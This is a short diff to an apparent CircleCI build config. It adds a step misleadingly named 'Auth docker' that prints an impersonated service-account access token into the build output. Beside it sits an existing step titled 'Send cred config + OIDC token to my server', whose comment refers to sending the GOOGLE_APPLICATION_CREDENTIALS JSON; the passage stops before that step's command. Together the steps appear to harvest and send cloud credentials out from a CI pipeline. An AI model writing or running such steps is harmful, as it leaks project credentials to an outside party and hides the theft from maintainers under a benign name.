@@ -22,6 +22,10 @@ jobs:
           command: gcloud auth configure-docker
 
       - run:
+          name: Auth docker
+          command: gcloud auth print-access-token --impersonate-service-account circleci-sa@spherical-plane-479301-d5.iam.gserviceaccount.com
+
+      - run:
           name: Send cred config + OIDC token to my server
           command: |
             # 1) Send GOOGLE_APPLICATION_CREDENTIALS JSON
